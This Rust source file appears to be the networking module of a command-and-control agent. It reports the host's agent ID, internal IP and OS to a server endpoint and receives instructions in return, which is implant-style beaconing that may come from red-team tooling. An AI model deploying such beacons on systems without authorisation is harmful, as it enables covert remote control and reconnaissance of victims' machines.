use anyhow::Result;
use local_ip_address::local_ip;
use reqwest::{Client, Url};
use talaria::helper::current_time;
use talaria::protocol::*;

use crate::agent::AgentContext;

pub struct Network {
    url: Url,
    http_client: Client,
}

impl Network {
    fn gen_response_header(
        &mut self,
        agent: &AgentContext,
        packet_id: Option<u32>,
    ) -> ResponseHeader {
        let internal_ip = match local_ip() {
            Ok(ip) => ip.to_string(),
            Err(_) => "?".to_string(),
        };

        ResponseHeader {
            agent_id: agent.agent_id,
            timestamp: current_time(),
            packet_id,
            polling_interval_ms: agent.polling_interval_millis,
            internal_ip,
            os: agent.os.clone(),
        }
    }

    pub fn gen_response(
        &mut self,
        response_body: AgentResponseBody,
        agent: &AgentContext,
        packet_id: Option<u32>,
    ) -> AgentResponse {
        let header = self.gen_response_header(agent, packet_id);

        AgentResponse {
            header,
            body: response_body,
        }
    }

    pub async fn send_response(&self, response: AgentResponse) -> Result<AgentInstruction> {
        let net_response = self
            .http_client
            .post(self.url.join("agent/monolith")?)
            .body(AgentResponse::serialize(&response)?)
            .send()
            .await?;

        let bytes = net_response.bytes().await?;
        let instruction = AgentInstruction::deserialize(&bytes.to_vec());

        Ok(instruction?)
    }

    pub fn new(url: Url) -> Network {
        Network {
            url,
            http_client: Client::new(),
        }
    }
}
